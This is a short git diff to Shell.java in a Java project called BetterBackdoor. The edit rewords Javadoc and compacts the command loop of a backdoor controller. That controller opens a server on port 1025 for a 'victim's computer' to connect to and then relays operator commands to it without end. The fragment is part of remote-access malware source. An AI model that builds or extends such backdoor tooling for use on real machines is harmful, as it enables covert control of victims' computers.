@@ -14,10 +14,11 @@ public class Shell {
 	public static PrintWriter out;
 
 	/**
-	 * Creates server on port 1025 for victim's computer to connect to. Once
-	 * connected initializes {@link socket}, {@link in}, and {@link out} and starts
-	 * an infinite loop that gets command {@link command} from user and handles it
-	 * with {@link HandleCommand.handle(command)}.
+	 * Starts shell to control backdoor.
+	 * <p>
+	 * Creates server on port 1025 for client to connect to. Once client has
+	 * connected, starts an infinite loop that gets command {@link command} from
+	 * user and handles it with {@link HandleCommand#handle(command)}.
 	 */
 	public static void start() {
 		System.out.println("Connecting...\n");
@@ -28,10 +29,8 @@ public class Shell {
 			out = new PrintWriter(socket.getOutputStream(), true);
 			System.out.println("Connection has been established");
 			System.out.println("Enter 'help' for a list of available commands");
-			while (true) {
-				String command = BetterBackdoor.getInput("");
-				HandleCommand.handle(command);
-			}
+			while (true)
+				HandleCommand.handle(BetterBackdoor.getInput(""));
 		} catch (Exception e) {
 			if (e.getMessage().equals("String index out of range: -1")
 					|| e.getMessage().equals("begin 0, end -1, length 0"))
